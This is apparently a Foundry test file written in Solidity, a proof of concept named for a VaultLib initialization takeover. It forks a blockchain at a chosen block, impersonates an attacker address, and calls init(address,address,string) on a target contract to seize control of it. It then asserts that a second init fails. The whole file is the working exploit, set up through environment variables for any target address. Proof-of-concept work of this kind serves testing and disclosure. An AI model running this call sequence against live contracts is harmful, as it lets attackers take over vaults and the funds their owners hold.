// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;
import "forge-std/Test.sol";
import "forge-std/console2.sol";

contract PoC_VaultLibInit is Test {
    address public target;
    address public attacker;
    string public fundName;

    function setUp() public {
        string memory rpc = vm.envString("RPC_URL");
        uint256 blockNum = vm.envUint("BLOCK_NUMBER");
        target = vm.envAddress("TARGET_ADDRESS");
        attacker = vm.envOr("ATTACKER", address(0xBEEF));
        fundName = vm.envOr("FUND_NAME", string("Fund"));
        vm.createSelectFork(rpc, blockNum);
    }

    function test_VaultLib_Init_Takeover() public {
        vm.startPrank(attacker, attacker);
        (bool success,) = target.call(abi.encodeWithSignature("init(address,address,string)", attacker, attacker, fundName));
        (bool secondSuccess,) = target.call(abi.encodeWithSignature("init(address,address,string)", attacker, attacker, fundName));
        vm.stopPrank();
        assertTrue(success, "Initial init did not succeed; already initialized or signature mismatch");
        assertTrue(!secondSuccess, "Second init still succeeded; cannot confirm single-use lock");
    }
}
